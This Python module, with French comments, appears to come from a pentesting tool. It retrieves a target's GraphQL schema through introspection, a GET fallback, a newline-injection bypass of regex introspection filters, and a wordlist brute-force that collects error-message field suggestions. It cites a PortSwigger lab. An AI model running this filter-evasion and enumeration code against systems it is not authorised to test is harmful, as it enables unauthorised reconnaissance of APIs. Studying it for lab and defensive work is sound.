# core/graphql_schema.py
"""
GraphQLSchema — Récupération du schéma GraphQL.

Stratégies dans l'ordre :
  1. Introspection POST standard
  2. Introspection GET (serveurs GET-only, ex: PortSwigger Lab 3)
  3. Bypass newline via GET (__schema\\n{) — contourne les regex naïves
  4. Oracle (clairvoyance) — si tout le reste échoue

Patch GET-only support:
  Certains serveurs refusent POST avec 405 Method Not Allowed mais
  acceptent GET ?query=... (PortSwigger Lab 3: /api GET-only).
  _gql_request() gère automatiquement le fallback POST→GET.
  _try_introspection_bypass() tente le bypass newline via GET.
"""

from __future__ import annotations

import os
import re
from dataclasses import dataclass, field
from typing import Optional

from core.requester import Requester
from logger.logger import logger


# ─────────────────────────────────────────────────────────────────────────────
#  Constantes
# ─────────────────────────────────────────────────────────────────────────────

GRAPHQL_ENDPOINTS: list[str] = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/graphql/v1",
    "/query",
    "/gql",
    # Non-standard — certains serveurs exposent GraphQL sur /api directement
    "/api",
    "/api/v1",
    "/api/v2",
]

_INTROSPECTION_QUERY = """
{
  __schema {
    queryType        { name }
    mutationType     { name }
    subscriptionType { name }
    types {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
        args {
          name
          description
          defaultValue
          type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
        }
        type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
      }
      inputFields {
        name
        description
        defaultValue
        type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
      }
      interfaces { kind name ofType { kind name ofType { kind name } } }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes { kind name ofType { kind name ofType { kind name } } }
    }
    directives {
      name
      description
      locations
      args {
        name
        description
        defaultValue
        type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
      }
    }
  }
}
"""

_INTROSPECTION_PROBE = "{ __schema { queryType { name } } }"

# Bypass newline — contourne les regex qui bloquent "__schema{"
# Le serveur filtre "__schema{" mais pas "__schema\n{"
# PortSwigger Lab 3 est vulnérable à ce bypass via GET
_INTROSPECTION_PROBE_NEWLINE  = "{ __schema\n{ queryType { name } } }"
_INTROSPECTION_QUERY_NEWLINE  = _INTROSPECTION_QUERY.replace(
    "__schema {", "__schema\n{"
)

_BUILTIN_PREFIXES = ("__",)

_WL_QUERIES   = "wordlists/gql-queries-1k.txt"
_WL_MUTATIONS = "wordlists/gql-mutations-1k.txt"
_WL_ORACLE    = "wordlists/gql-oracle.txt"

_SUGGESTION_PATTERNS = [
    re.compile(r"""Did you mean ['\"](?P<field>[_0-9A-Za-z]+)['\"]"""),
    re.compile(r"""Did you mean ['\"](?P<one>[_0-9A-Za-z]+)['\"] or ['\"](?P<two>[_0-9A-Za-z]+)['\"]"""),
    re.compile(r"""Did you mean (?P<multi>(?:['\"][_0-9A-Za-z]+['\"],?\s*)+)"""),
]


# ─────────────────────────────────────────────────────────────────────────────
#  Dataclass de résultat
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class FieldInfo:
    name: str
    args: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {"name": self.name, "args": self.args}


@dataclass
class GraphQLSchemaResult:
    endpoint:          str
    method:            str
    queries:           list[FieldInfo] = field(default_factory=list)
    mutations:         list[FieldInfo] = field(default_factory=list)
    types:             list[str]       = field(default_factory=list)
    raw_introspection: Optional[dict]  = None

    @property
    def query_names(self) -> list[str]:
        return [q.name for q in self.queries]

    @property
    def mutation_names(self) -> list[str]:
        return [m.name for m in self.mutations]

    @property
    def has_schema(self) -> bool:
        return bool(self.queries or self.mutations or self.types)

    def to_dict(self) -> dict:
        return {
            "endpoint":          self.endpoint,
            "method":            self.method,
            "queries":           [q.to_dict() for q in self.queries],
            "mutations":         [m.to_dict() for m in self.mutations],
            "types":             self.types,
            "raw_introspection": self.raw_introspection,
        }

    @staticmethod
    def from_dict(d: dict) -> "GraphQLSchemaResult":
        return GraphQLSchemaResult(
            endpoint          = d.get("endpoint", ""),
            method            = d.get("method", "none"),
            queries           = [FieldInfo(**q) for q in d.get("queries", [])],
            mutations         = [FieldInfo(**m) for m in d.get("mutations", [])],
            types             = d.get("types", []),
            raw_introspection = d.get("raw_introspection"),
        )

    def __str__(self) -> str:
        return (
            f"GraphQLSchema [{self.method}] — {self.endpoint}\n"
            f"  queries   : {len(self.queries)}\n"
            f"  mutations : {len(self.mutations)}\n"
            f"  types     : {len(self.types)}"
        )


# ─────────────────────────────────────────────────────────────────────────────
#  GraphQLSchemaFetcher
# ─────────────────────────────────────────────────────────────────────────────

class GraphQLSchemaFetcher:
    """
    Récupère le schéma GraphQL d'un endpoint.

    Ordre des tentatives :
      1. POST introspection standard
      2. GET introspection (endpoints GET-only, 405 sur POST)
      3. GET + bypass newline (__schema\\n{) — contourne les regex
      4. Oracle / clairvoyance (suggestions d'erreur)
    """

    def __init__(
        self,
        base_url: str,
        timeout:  int = 5,
        token:    Optional[str] = None,
    ) -> None:
        self.base_url  = base_url.rstrip("/")
        self.http      = Requester(self.base_url, timeout=timeout)
        self._get_only = False   # True si POST → 405 détecté

        if token:
            self.http.set_token(token)

    # =========================================================================
    #  Point d'entrée public
    # =========================================================================

    def fetch(self, endpoint: Optional[str] = None) -> GraphQLSchemaResult:
        """
        Tente de récupérer le schéma GraphQL via toutes les stratégies.

        Ordre :
          1. Introspection POST/GET standard
          2. Bypass newline via GET (si introspection bloquée par regex)
          3. Oracle (clairvoyance via suggestions d'erreur)
        """
        logger.info("[*] GraphQL schema fetch — démarrage")

        candidates = [endpoint] if endpoint else [
            f"{self.base_url}{p}" for p in GRAPHQL_ENDPOINTS
        ]

        # ── Stratégie 1 : Introspection standard (POST puis GET fallback) ─────
        for ep in candidates:
            result = self._try_introspection(ep)
            if result is not None:
                logger.info(f"[+] Schéma récupéré par introspection — {ep}")
                logger.info(
                    f"    queries: {len(result.queries)} | "
                    f"mutations: {len(result.mutations)} | "
                    f"types: {len(result.types)}"
                )
                return result

        logger.info("[*] Introspection standard bloquée — tentative bypass newline")

        # ── Stratégie 2 : Bypass newline via GET ──────────────────────────────
        # Technique : GET /api?query={ __schema\n{ queryType { name } } }
        # Le serveur filtre "__schema{" mais pas "__schema\n{"
        # PortSwigger Lab 3 est vulnérable à ce bypass
        for ep in candidates:
            result = self._try_introspection_bypass(ep)
            if result is not None:
                logger.info(f"[+] Schéma récupéré par bypass newline — {ep}")
                logger.info(
                    f"    queries: {len(result.queries)} | "
                    f"mutations: {len(result.mutations)} | "
                    f"types: {len(result.types)}"
                )
                return result

        logger.info("[*] Bypass newline échoué — tentative oracle (clairvoyance)")

        # ── Stratégie 3 : Oracle (clairvoyance) ──────────────────────────────
        for ep in candidates:
            result = self._try_oracle(ep)
            if result is not None and result.has_schema:
                logger.info(f"[+] Schéma partiel via oracle — {ep}")
                logger.info(
                    f"    queries: {len(result.queries)} | "
                    f"mutations: {len(result.mutations)}"
                )
                return result

        logger.warning(
            "[!] Schéma GraphQL non récupérable "
            "(introspection off, bypass échoué, oracle sans résultat)"
        )
        return GraphQLSchemaResult(
            endpoint = candidates[0] if candidates else self.base_url,
            method   = "none",
        )

    # =========================================================================
    #  Helper — requête GraphQL avec GET fallback si 405
    # =========================================================================

    def _gql_request(self, path: str, query: str, use_get: bool = False):
        """
        Envoie une requête GraphQL — POST first, GET fallback si 405.

        Args:
            path    : chemin de l'endpoint
            query   : requête GraphQL
            use_get : forcer GET directement (pour bypass newline)

        Returns:
            réponse HTTP ou None

        Side effect:
            Met à jour self._get_only = True si POST retourne 405.
        """
        if use_get or self._get_only:
            return self.http.get(path, params={"query": query})

        r = self.http.post(path, json={"query": query})

        # GET fallback si POST refusé (405 Method Not Allowed)
        if r is None or r.status_code == 405:
            logger.debug(f"[schema] POST {path} → 405 — fallback GET")
            self._get_only = True
            return self.http.get(path, params={"query": query})

        return r

    # =========================================================================
    #  Stratégie 1 — Introspection standard
    # =========================================================================

    def _try_introspection(self, endpoint: str) -> Optional[GraphQLSchemaResult]:
        """
        Tente l'introspection sur un endpoint.
        Utilise POST avec fallback GET automatique si 405.
        """
        path = self._to_path(endpoint)

        # Probe rapide
        r_probe = self._gql_request(path, _INTROSPECTION_PROBE)
        if not self._is_gql_response(r_probe):
            return None

        # Introspection complète
        r = self._gql_request(path, _INTROSPECTION_QUERY)
        if not self._is_gql_response(r):
            return None

        try:
            body = r.json()
        except Exception:
            return None

        schema_data = body.get("data", {}).get("__schema")
        if not schema_data:
            # Introspection bloquée — retourner None pour tenter le bypass
            logger.debug(f"[schema] Introspection bloquée sur {endpoint}")
            return None

        method = "introspection_get" if self._get_only else "introspection"
        return self._parse_introspection(endpoint, body, method=method)

    # =========================================================================
    #  Stratégie 2 — Bypass newline via GET
    # =========================================================================

    def _try_introspection_bypass(self, endpoint: str) -> Optional[GraphQLSchemaResult]:
        """
        Contourne les filtres d'introspection via injection de newline.

        Technique :
          GET /api?query={ __schema\\n{ queryType { name } } }

        Le serveur bloque "__schema{" par regex mais "__schema\\n{" passe.
        Cette technique est documentée dans OWASP GraphQL Security Cheat Sheet.

        Fonctionne uniquement via GET — les serveurs qui filtrent POST
        n'appliquent pas toujours le même filtre sur GET.
        PortSwigger Lab 3 est exactement ce scénario.
        """
        path = self._to_path(endpoint)

        # Test rapide avec newline probe
        r_probe = self.http.get(path, params={"query": _INTROSPECTION_PROBE_NEWLINE})
        if not self._is_gql_response(r_probe):
            return None

        try:
            probe_body = r_probe.json()
        except Exception:
            return None

        # Vérifier si le bypass a fonctionné (schéma partiel reçu)
        if not probe_body.get("data", {}).get("__schema"):
            logger.debug(f"[schema] Bypass newline probe bloqué sur {endpoint}")
            return None

        logger.info(f"[schema] Bypass newline confirmé → {endpoint}")

        # Introspection complète avec newline bypass
        r = self.http.get(path, params={"query": _INTROSPECTION_QUERY_NEWLINE})
        if not self._is_gql_response(r):
            # Essayer avec la query simplifiée si la complète échoue
            simple_query = (
                "{ __schema\n{ queryType { name } mutationType { name } "
                "types { name kind fields(includeDeprecated: true) { "
                "name args { name } type { kind name ofType { kind name } } } } } }"
            )
            r = self.http.get(path, params={"query": simple_query})
            if not self._is_gql_response(r):
                return None

        try:
            body = r.json()
        except Exception:
            return None

        schema_data = body.get("data", {}).get("__schema")
        if not schema_data:
            return None

        return self._parse_introspection(endpoint, body, method="bypass_newline_get")

    # =========================================================================
    #  Parse introspection
    # =========================================================================

    def _parse_introspection(
        self,
        endpoint: str,
        raw:      dict,
        method:   str = "introspection",
    ) -> GraphQLSchemaResult:
        """Parse la réponse d'introspection en GraphQLSchemaResult."""
        schema      = raw.get("data", {}).get("__schema", {})
        query_type  = (schema.get("queryType")    or {}).get("name", "Query")
        mut_type    = (schema.get("mutationType") or {}).get("name", "Mutation")
        all_types   = schema.get("types", [])

        queries:    list[FieldInfo] = []
        mutations:  list[FieldInfo] = []
        type_names: list[str]       = []

        for t in all_types:
            name = t.get("name", "")
            if any(name.startswith(p) for p in _BUILTIN_PREFIXES):
                continue

            type_names.append(name)
            fields = t.get("fields") or []

            if name == query_type:
                for f in fields:
                    queries.append(FieldInfo(
                        name = f["name"],
                        args = [a["name"] for a in (f.get("args") or [])],
                    ))
            elif name == mut_type:
                for f in fields:
                    mutations.append(FieldInfo(
                        name = f["name"],
                        args = [a["name"] for a in (f.get("args") or [])],
                    ))

        return GraphQLSchemaResult(
            endpoint          = endpoint,
            method            = method,
            queries           = queries,
            mutations         = mutations,
            types             = type_names,
            raw_introspection = raw,
        )

    # =========================================================================
    #  Stratégie 3 — Oracle / Clairvoyance
    # =========================================================================

    def _try_oracle(self, endpoint: str) -> Optional[GraphQLSchemaResult]:
        """
        Bruteforce les champs via les suggestions d'erreur GraphQL.
        Utilise GET si l'endpoint ne supporte pas POST.
        """
        path = self._to_path(endpoint)

        # Vérifier que l'endpoint répond
        r_check = self._gql_request(path, "{ __typename }")
        if not self._is_gql_response(r_check):
            return None

        words = self._load_wordlist(_WL_ORACLE)
        if not words:
            words = self._load_wordlist(_WL_QUERIES) + self._load_wordlist(_WL_MUTATIONS)

        if not words:
            logger.warning("[oracle] Aucune wordlist disponible")
            return None

        logger.info(f"[*] Oracle — {len(words)} mots → {endpoint}")

        discovered_queries:   set[str] = set()
        discovered_mutations: set[str] = set()

        query_words = self._load_wordlist(_WL_QUERIES) or words[:500]
        for word in query_words:
            suggestions = self._probe_field(path, word, context="query")
            discovered_queries.update(suggestions)

        mutation_words = self._load_wordlist(_WL_MUTATIONS) or words[:500]
        for word in mutation_words:
            suggestions = self._probe_field(path, word, context="mutation")
            discovered_mutations.update(suggestions)

        if not discovered_queries and not discovered_mutations:
            logger.info("[oracle] Aucune suggestion reçue")
            return GraphQLSchemaResult(endpoint=endpoint, method="oracle")

        return GraphQLSchemaResult(
            endpoint  = endpoint,
            method    = "oracle",
            queries   = [FieldInfo(name=q) for q in sorted(discovered_queries)],
            mutations = [FieldInfo(name=m) for m in sorted(discovered_mutations)],
        )

    def _probe_field(self, path: str, word: str, context: str = "query") -> set[str]:
        """
        Envoie un champ invalide et extrait les suggestions.
        Utilise GET si l'endpoint est GET-only.
        """
        if context == "mutation":
            query = f"mutation {{ {word} }}"
        else:
            query = f"{{ {word} }}"

        r = self._gql_request(path, query)
        if r is None:
            return set()

        try:
            body   = r.json()
            errors = body.get("errors", [])
        except Exception:
            return set()

        suggestions: set[str] = set()
        for error in errors:
            message = error.get("message", "")
            suggestions.update(self._extract_suggestions(message))

        return suggestions

    def _extract_suggestions(self, message: str) -> set[str]:
        found: set[str] = set()
        for pattern in _SUGGESTION_PATTERNS:
            for m in pattern.finditer(message):
                gd = m.groupdict()
                if "field" in gd and gd["field"]:
                    found.add(gd["field"])
                if "one"   in gd and gd["one"]:
                    found.add(gd["one"])
                if "two"   in gd and gd["two"]:
                    found.add(gd["two"])
                if "multi" in gd and gd["multi"]:
                    for word in re.findall(r"[_0-9A-Za-z]+", gd["multi"]):
                        found.add(word)
                if "last"  in gd and gd["last"]:
                    found.add(gd["last"])
        return found

    # =========================================================================
    #  Helpers
    # =========================================================================

    def _to_path(self, endpoint: str) -> str:
        return endpoint.replace(self.base_url, "") or "/"

    def _is_gql_response(self, r) -> bool:
        if r is None:
            return False
        if r.status_code not in (200, 400):
            return False
        try:
            body = r.json()
            return "data" in body or "errors" in body
        except Exception:
            return False

    def _load_wordlist(self, relative_path: str) -> list[str]:
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        full = os.path.join(root, relative_path)
        if not os.path.isfile(full):
            logger.debug(f"[schema] Wordlist introuvable : {full}")
            return []
        try:
            with open(full, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.debug(f"[schema] Erreur lecture wordlist {full} : {e}")
            return []


# ─────────────────────────────────────────────────────────────────────────────
#  Fonction utilitaire — usage direct depuis discovery.py
# ─────────────────────────────────────────────────────────────────────────────

def fetch_graphql_schema(
    base_url:       str,
    timeout:        int = 5,
    token:          Optional[str] = None,
    known_endpoint: Optional[str] = None,
) -> GraphQLSchemaResult:
    """
    Point d'entrée simple pour discovery.py.

    Args:
        base_url       : URL de base de l'API
        timeout        : timeout HTTP
        token          : token d'auth optionnel
        known_endpoint : endpoint GraphQL déjà découvert (depuis _score_graphql)
    """
    fetcher = GraphQLSchemaFetcher(base_url, timeout=timeout, token=token)
    return fetcher.fetch(endpoint=known_endpoint)